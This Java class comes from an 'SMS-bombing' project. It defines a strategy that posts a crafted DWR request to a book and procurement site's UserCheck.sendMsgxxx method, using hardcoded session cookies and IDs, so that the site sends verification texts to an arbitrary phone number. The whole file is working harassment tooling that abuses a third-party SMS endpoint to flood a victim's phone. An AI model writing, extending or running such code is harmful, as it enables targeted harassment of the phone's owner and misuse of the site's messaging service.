package com.github.bombing.strategy;

/**
 * @projectName: SMS-bombing
 * @package: com.github.bombing.execute.strategy
 * @className: Book51Strategy
 * @date: 2022/3/15
 * @version: 1.0
 */
public class Book51Strategy extends AbstractBombingStrategy<String> {

    @Override
    public Strategy strategy() {
        return Strategy.BOOK_51;
    }

    @Override
    protected void before() {
        HEADERS.put(CONTENT_TYPE, "text/plain");
        HEADERS.put(COOKIE, "JSESSIONID=09516B895D0F7AF6148FB10F5780AFB6-n2; Hm_lvt_68bbc3f1f3355bd0f6bce8fe015efbb8=1648620679; Hm_lpvt_68bbc3f1f3355bd0f6bce8fe015efbb8=1648620679; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2217fd97334cc580-03132c8a520de2-1c3d645d-1764000-17fd97334cdd13%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2217fd97334cc580-03132c8a520de2-1c3d645d-1764000-17fd97334cdd13%22%7D");
    }

    @Override
    protected String body() {
        return "callCount=1\n" +
                "windowName=\n" +
                "c0-scriptName=UserCheck\n" +
                "c0-methodName=sendMsgxxx\n" +
                "c0-id=0\n" +
                "c0-param0=string:" + phone + "\n" +
                "batchId=2\n" +
                "page=%2Fcaigou%2Fmanage%2FdesignatedRegistryNewSignon.in\n" +
                "httpSessionId=09516B895D0F7AF6148FB10F5780AFB6-n2\n" +
                "scriptSessionId=10B57D342A84B347F1D47F8E537DC1B6";
    }

    @Override
    protected void doResp(String res) {
        logger.info(">>> " + strategy().getDesc() + " 请求成功, 返回内容为: " + res);
    }

}
